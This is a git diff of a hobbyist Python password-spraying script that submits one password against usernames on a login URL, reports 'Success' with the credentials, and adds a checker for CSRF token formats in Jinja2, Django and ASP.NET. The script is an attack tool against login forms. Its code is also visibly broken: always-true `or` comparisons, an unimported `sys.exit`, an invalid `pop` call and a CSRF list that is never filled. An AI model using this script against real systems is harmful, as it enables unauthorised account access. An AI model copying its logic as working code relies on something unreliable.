@@ -1,16 +1,28 @@
 import requests
+from sys import exit
+#from checks import frameworkChecker
 
-#Code reviewed, time to hustle.
-def passwordSpray(password: str, url: str, framework: str) -> bool:
-    #if framework == "Jinga2" or "jinga2":                     // Future code for framework handling
-        #csrf = ["{{ csrf_token }}", "{% csrf_token %}"]       // Sets csrf list to include formats present
-    #elif framework == "Django" or "django":                   // within that templating engine
-        #csrf = ["csrf_token", "{% csrf_token %}"]
-    #elif framework == "ASP.NET" or "asp.net":
-        #csrf = ["RequestVerificationToken","Html.AntiForgeryToken","__RequestVerificationToken"]
-    #else:
-        #print("No framework selected, program will use list of all frameworks in this program.","\n","However, this is less efficient. You should walk the site and attempt to discover its framework by seeing how it handles input")
+#Im just playing around, I like that im learning about csrf a lot while googling.
+
+#Eventually this is going to be so large it'll have to be in checks.py
+def frameworkChecker(framework: str) -> bool:
+    if framework == "Jinga2" or "jinga2":                    
+        csrf = ["{{ csrf_token }}", "{% csrf_token %}"]
+        return True      
+    if framework == "Django" or "django":                   
+        csrf = ["csrf_token", "{% csrf_token %}"]
+        return True
+    if framework == "ASP.NET" or "asp.net":
+        csrf = ["RequestVerificationToken","Html.AntiForgeryToken","__RequestVerificationToken"]
+        return True
+    if not True:
+        sys.exit("Framework was not selected!")
+        
     
+
+def passwordSpray(password: str, url: str, framework: str) -> bool:
+    csrf = []
+    frameworkChecker(framework)
     print("""
      _____ _               _____                       _  ______            _        __                   
     /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
@@ -28,10 +40,11 @@ def passwordSpray(password: str, url: str, framework: str) -> bool:
             #Code here for debug, if I move unsuccessful passwords out, then the final list is self-documenting.
             print(username.pop(username))
             pass
-        if "csrf" in str(response.content):
+        for i in csrf:    
+            if csrf in str(response.content):
                                                     # I sorta get what you're saying here, but I don't understand the benefits. Am I correct to say, init the dictionary and then save headers response into that dict to be looked at further?
-            print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
-            return False
+                print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
+                return False
         else:
             print(f"Success: Username: ---> ", {username}, "\n", "Password: ---> ", {password})
             return True
